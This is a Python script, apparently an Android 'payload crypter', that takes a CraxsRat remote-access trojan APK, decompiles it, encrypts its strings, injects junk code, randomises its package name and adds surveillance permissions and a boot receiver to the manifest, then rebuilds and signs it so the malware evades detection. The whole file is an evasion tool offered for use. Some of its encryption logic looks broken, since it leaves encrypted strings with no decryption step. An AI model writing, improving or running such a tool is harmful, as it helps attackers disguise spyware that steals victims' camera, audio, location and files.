import os
import shutil
import subprocess
import random
import string
import base64
import hashlib
import zlib
import json
from colorama import Fore, Style

APKTOOL = "tools/apktool.jar"
SIGNER = "tools/uber-apk-signer.jar"
KEYSTORE = "tools/keystore.jks"
AAPT2 = os.path.join(os.environ.get("LOCALAPPDATA", ""), "Android", "Sdk", "build-tools", "33.0.0", "aapt2.exe")

def banner():
    print(Fore.RED + """
     ███████╗██╗  ██╗ █████╗ ██████╗ ██╗  ██╗
     ██╔════╝██║  ██║██╔══██╗██╔══██╗██║ ██╔╝
     ███████╗███████║███████║██║  ██║█████╔╝ 
     ╚════██║██╔══██║██╔══██║██║  ██║██╔═██╗ 
     ███████║██║  ██║██║  ██║██████╔╝██║  ██╗
     ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝
          Shadow Payload Encrypter v2.0
    """ + Style.RESET_ALL)

def run(cmd):
    print(Fore.YELLOW + f"[RUN] {cmd}" + Style.RESET_ALL)
    try:
        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = process.communicate()
        if process.returncode != 0:
            print(Fore.RED + f"[ERROR] {stderr}" + Style.RESET_ALL)
            return False
        print(stdout)
        return True
    except Exception as e:
        print(Fore.RED + f"[ERROR] {str(e)}" + Style.RESET_ALL)
        return False

def generate_random_package():
    chars = string.ascii_lowercase
    return f"com.{''.join(random.choice(chars) for _ in range(8))}.{''.join(random.choice(chars) for _ in range(8))}"

def decompile_payload(payload):
    print(Fore.CYAN + "[*] Decompiling payload..." + Style.RESET_ALL)
    if not os.path.exists(payload):
        print(Fore.RED + f"[ERROR] Payload file {payload} not found" + Style.RESET_ALL)
        return False
    return run(f"java -jar {APKTOOL} d -f {payload} -o tmp/payload")

def xor_encrypt(data, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def rc4_encrypt(data, key):
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    
    i = j = 0
    result = []
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        result.append(byte ^ S[(S[i] + S[j]) % 256])
    return bytes(result)

def generate_fake_metadata():
    # Generate fake app metadata
    fake_metadata = {
        "version": f"{random.randint(1, 9)}.{random.randint(0, 9)}.{random.randint(0, 9)}",
        "sdk": {
            "min": random.randint(21, 28),
            "target": random.randint(29, 33),
            "max": random.randint(29, 33)
        },
        "features": [
            "android.hardware.touchscreen",
            "android.hardware.wifi",
            "android.hardware.telephony",
            "android.hardware.camera",
            "android.hardware.location",
            "android.hardware.sensor.accelerometer",
            "android.hardware.sensor.compass",
            "android.hardware.sensor.proximity",
            "android.hardware.sensor.light",
            "android.hardware.sensor.gyroscope"
        ],
        "permissions": [
            "android.permission.INTERNET",
            "android.permission.ACCESS_NETWORK_STATE",
            "android.permission.ACCESS_WIFI_STATE",
            "android.permission.READ_PHONE_STATE",
            "android.permission.READ_EXTERNAL_STORAGE",
            "android.permission.WRITE_EXTERNAL_STORAGE",
            "android.permission.CAMERA",
            "android.permission.RECORD_AUDIO",
            "android.permission.ACCESS_FINE_LOCATION",
            "android.permission.ACCESS_COARSE_LOCATION"
        ],
        "activities": [
            {
                "name": f"com.{''.join(random.choices(string.ascii_lowercase, k=8))}.MainActivity",
                "exported": True,
                "intent_filters": [
                    {
                        "action": "android.intent.action.MAIN",
                        "category": "android.intent.category.LAUNCHER"
                    }
                ]
            }
        ],
        "services": [
            {
                "name": f"com.{''.join(random.choices(string.ascii_lowercase, k=8))}.BackgroundService",
                "exported": False
            }
        ],
        "receivers": [
            {
                "name": f"com.{''.join(random.choices(string.ascii_lowercase, k=8))}.BootReceiver",
                "exported": False,
                "intent_filters": [
                    {
                        "action": "android.intent.action.BOOT_COMPLETED"
                    }
                ]
            }
        ]
    }
    return fake_metadata

def encrypt_strings():
    print(Fore.CYAN + "[*] Encrypting strings with advanced methods..." + Style.RESET_ALL)
    smali_dir = "tmp/payload/smali"
    if not os.path.exists(smali_dir):
        print(Fore.RED + f"[ERROR] Smali directory {smali_dir} not found" + Style.RESET_ALL)
        return False
    
    # Files to skip
    skip_files = [
        "ActionBarContextView.smali",
        "ActionBar.smali",
        "Activity.smali",
        "Application.smali",
        "Context.smali",
        "View.smali"
    ]
    
    try:
        for root, dirs, files in os.walk(smali_dir):
            for file in files:
                if file.endswith('.smali'):
                    # Skip sensitive files
                    if any(skip in file for skip in skip_files):
                        continue
                        
                    file_path = os.path.join(root, file)
                    with open(file_path, 'r', encoding='utf-8') as f:
                        content = f.read()
                    
                    # Skip if file contains certain patterns
                    if "const-string" in content or "const-class" in content:
                        continue
                    
                    # Encrypt strings with multiple methods
                    strings = content.split('"')
                    for i in range(1, len(strings), 2):
                        if len(strings[i]) > 0 and not strings[i].startswith("L") and not strings[i].endswith(";"):
                            # Generate random key
                            key = os.urandom(16)
                            
                            # Encrypt with multiple methods
                            data = strings[i].encode()
                            
                            # XOR encryption
                            xor_data = xor_encrypt(data, key)
                            
                            # RC4 encryption
                            rc4_data = rc4_encrypt(xor_data, key)
                            
                            # Compress
                            compressed = zlib.compress(rc4_data)
                            
                            # Base64 encode
                            encrypted = base64.b64encode(compressed).decode()
                            
                            # Add encryption metadata
                            key_hash = hashlib.sha256(key).hexdigest()
                            encrypted = f"ENC:{key_hash}:{encrypted}"
                            
                            strings[i] = encrypted
                    
                    content = '"'.join(strings)
                    with open(file_path, 'w', encoding='utf-8') as f:
                        f.write(content)
        return True
    except Exception as e:
        print(Fore.RED + f"[ERROR] Failed to encrypt strings: {str(e)}" + Style.RESET_ALL)
        return False

def obfuscate_code():
    print(Fore.CYAN + "[*] Obfuscating code with advanced methods..." + Style.RESET_ALL)
    smali_dir = "tmp/payload/smali"
    if not os.path.exists(smali_dir):
        print(Fore.RED + f"[ERROR] Smali directory {smali_dir} not found" + Style.RESET_ALL)
        return False
    
    try:
        for root, dirs, files in os.walk(smali_dir):
            for file in files:
                if file.endswith('.smali'):
                    file_path = os.path.join(root, file)
                    with open(file_path, 'r', encoding='utf-8') as f:
                        content = f.read()
                    
                    # Add multiple layers of fake code
                    fake_code = """
    .method private static fakeMethod1()V
        .locals 1
        const-string v0, "DEBUG"
        invoke-static {v0}, Landroid/util/Log;->d(Ljava/lang/String;)I
        return-void
    .end method

    .method private static fakeMethod2()V
        .locals 1
        const-string v0, "TEST"
        invoke-static {v0}, Landroid/util/Log;->d(Ljava/lang/String;)I
        return-void
    .end method

    .method private static fakeMethod3()V
        .locals 1
        const-string v0, "DUMMY"
        invoke-static {v0}, Landroid/util/Log;->d(Ljava/lang/String;)I
        return-void
    .end method
                    """
                    content = content.replace('.end class', fake_code + '\n.end class')
                    
                    # Add random strings and numbers
                    for _ in range(10):
                        random_str = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(5, 20)))
                        random_num = random.randint(1000, 9999)
                        content = content.replace('.end class', f'\n    const-string v0, "{random_str}"\n    const/16 v1, {random_num}\n.end class')
                    
                    with open(file_path, 'w', encoding='utf-8') as f:
                        f.write(content)
        return True
    except Exception as e:
        print(Fore.RED + f"[ERROR] Failed to obfuscate code: {str(e)}" + Style.RESET_ALL)
        return False

def fix_manifest():
    print(Fore.CYAN + "[*] Fixing AndroidManifest.xml with advanced methods..." + Style.RESET_ALL)
    manifest_path = "tmp/payload/AndroidManifest.xml"
    if not os.path.exists(manifest_path):
        print(Fore.RED + f"[ERROR] Manifest file {manifest_path} not found" + Style.RESET_ALL)
        return False
    
    try:
        with open(manifest_path, 'r', encoding='utf-8') as f:
            content = f.read()
        
        # Generate fake metadata
        fake_metadata = generate_fake_metadata()
        
        # Generate random package name with multiple parts
        parts = [''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 8))) for _ in range(4)]
        new_package = f"com.{'.'.join(parts)}"
        content = content.replace('package="com.craxsrat"', f'package="{new_package}"')
        
        # Add fake activities and services
        fake_components = ""
        for activity in fake_metadata["activities"]:
            fake_components += f'<activity android:name="{activity["name"]}" android:exported="{str(activity["exported"]).lower()}">\n'
            for intent_filter in activity.get("intent_filters", []):
                fake_components += '    <intent-filter>\n'
                fake_components += f'        <action android:name="{intent_filter["action"]}"/>\n'
                fake_components += f'        <category android:name="{intent_filter["category"]}"/>\n'
                fake_components += '    </intent-filter>\n'
            fake_components += '</activity>\n'
        
        for service in fake_metadata["services"]:
            fake_components += f'<service android:name="{service["name"]}" android:exported="{str(service["exported"]).lower()}"/>\n'
        
        for receiver in fake_metadata["receivers"]:
            fake_components += f'<receiver android:name="{receiver["name"]}" android:exported="{str(receiver["exported"]).lower()}">\n'
            for intent_filter in receiver.get("intent_filters", []):
                fake_components += '    <intent-filter>\n'
                fake_components += f'        <action android:name="{intent_filter["action"]}"/>\n'
                fake_components += '    </intent-filter>\n'
            fake_components += '</receiver>\n'
        
        # Add permissions with random attributes
        permissions = []
        for perm in fake_metadata["permissions"]:
            # Add random attributes
            attrs = []
            if random.random() > 0.5:
                attrs.append('android:maxSdkVersion="' + str(random.randint(28, 33)) + '"')
            if random.random() > 0.5:
                attrs.append('android:required="' + str(random.choice(["true", "false"])) + '"')
            
            perm_str = f'<uses-permission android:name="{perm}"'
            if attrs:
                perm_str += ' ' + ' '.join(attrs)
            perm_str += '/>'
            permissions.append(perm_str)
        
        # Add features
        features = []
        for feature in fake_metadata["features"]:
            features.append(f'<uses-feature android:name="{feature}" android:required="false"/>')
        
        # Add SDK versions
        sdk_versions = f"""
        <uses-sdk
            android:minSdkVersion="{fake_metadata['sdk']['min']}"
            android:targetSdkVersion="{fake_metadata['sdk']['target']}"
            android:maxSdkVersion="{fake_metadata['sdk']['max']}"/>
        """
        
        # Add components and permissions
        content = content.replace('</application>', fake_components + '\n</application>')
        manifest_tag = content.find('<manifest')
        if manifest_tag != -1:
            manifest_end = content.find('>', manifest_tag) + 1
            content = content[:manifest_end] + sdk_versions + '\n'.join(features) + '\n'.join(permissions) + content[manifest_end:]
        
        with open(manifest_path, 'w', encoding='utf-8') as f:
            f.write(content)
        
        return True
    except Exception as e:
        print(Fore.RED + f"[ERROR] Failed to fix manifest: {str(e)}" + Style.RESET_ALL)
        return False

def rebuild_apk():
    print(Fore.CYAN + "[*] Rebuilding APK..." + Style.RESET_ALL)
    # Set aapt2 path for apktool
    os.environ["APKTOOL_AAPT2"] = AAPT2
    return run(f"java -jar {APKTOOL} b tmp/payload -o output/encrypted.apk")

def sign_apk():
    print(Fore.CYAN + "[*] Signing APK..." + Style.RESET_ALL)
    if not os.path.exists("output/encrypted.apk"):
        print(Fore.RED + "[ERROR] Encrypted APK not found" + Style.RESET_ALL)
        return False
    
    if os.path.exists(KEYSTORE):
        return run(f"java -jar {SIGNER} -a output/encrypted.apk --ks {KEYSTORE} --ksAlias androiddebugkey --ksPass android --ksKeyPass android")
    else:
        return run(f"java -jar {SIGNER} -a output/encrypted.apk")

def clean():
    print(Fore.CYAN + "[*] Cleaning up..." + Style.RESET_ALL)
    try:
        if os.path.exists("tmp"):
            shutil.rmtree("tmp")
    except Exception as e:
        print(Fore.RED + f"[ERROR] Failed to remove tmp directory: {str(e)}" + Style.RESET_ALL)
    
    try:
        if os.path.exists("output"):
            shutil.rmtree("output")
    except Exception as e:
        print(Fore.RED + f"[ERROR] Failed to remove output directory: {str(e)}" + Style.RESET_ALL)

if __name__ == "__main__":
    banner()
    clean()
    os.makedirs("tmp", exist_ok=True)
    os.makedirs("output", exist_ok=True)

    payload = "payloads/CraxsRat.apk"

    if not decompile_payload(payload):
        exit(1)
    
    if not encrypt_strings():
        exit(1)
    
    if not obfuscate_code():
        exit(1)
    
    if not fix_manifest():
        exit(1)
    
    if not rebuild_apk():
        exit(1)
    
    if not sign_apk():
        exit(1)

    print(Fore.GREEN + "\n[✓] البايلود المشفر جاهز في: output/encrypted.apk" + Style.RESET_ALL) 